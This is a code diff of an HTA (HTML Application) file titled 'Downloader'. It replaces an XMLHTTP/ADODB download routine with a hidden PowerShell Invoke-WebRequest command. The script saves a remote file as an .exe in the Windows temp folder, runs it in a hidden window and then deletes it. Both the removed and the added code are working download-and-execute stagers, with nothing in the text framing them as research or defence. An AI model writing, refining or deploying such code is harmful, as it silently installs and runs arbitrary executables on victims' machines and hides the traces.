@@ -1,6 +1,6 @@
 <html>
 <head>
-  <title>Downloader - Hidden</title>
+  <title>Downloader - PowerShell Download</title>
   <HTA:APPLICATION
     ID="app"
     BORDER="none"
@@ -24,26 +24,25 @@
       Set fso = CreateObject("Scripting.FileSystemObject")
       savePath = fso.GetSpecialFolder(2) & "\downloadedfile.exe"
 
-      Dim xmlHttp, adoStream, shell
-      Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
-      xmlHttp.Open "GET", fileUrl, False
-      xmlHttp.Send
+      Dim shell, cmd, exitCode
+      Set shell = CreateObject("WScript.Shell")
 
-      If xmlHttp.Status = 200 Then
-        Set adoStream = CreateObject("ADODB.Stream")
-        adoStream.Type = 1 ' Binary
-        adoStream.Open
-        adoStream.Write xmlHttp.ResponseBody
-        adoStream.SaveToFile savePath, 2
-        adoStream.Close
+      ' Build PowerShell command to download file quietly
+      cmd = "powershell -NoProfile -WindowStyle Hidden -Command " & _
+            """Invoke-WebRequest -Uri '" & fileUrl & "' -OutFile '" & savePath & "'"""
 
-        Set shell = CreateObject("WScript.Shell")
-        shell.Run Chr(34) & savePath & Chr(34), 0, False ' 0 = hidden window, async
+      ' Run PowerShell download, wait for completion
+      exitCode = shell.Run(cmd, 0, True)
 
-        ' Wait approx 3 seconds before deleting the file (no WScript.Sleep in HTA, so skip)
+      If exitCode = 0 Then
+        ' Run the downloaded executable hidden
+        shell.Run Chr(34) & savePath & Chr(34), 0, False
 
+        ' Optional: delete after running (delayed cleanup omitted here for simplicity)
         On Error Resume Next
         fso.DeleteFile savePath, True
+      Else
+        MsgBox "Download failed with exit code " & exitCode, vbExclamation, "Error"
       End If
 
       window.close()
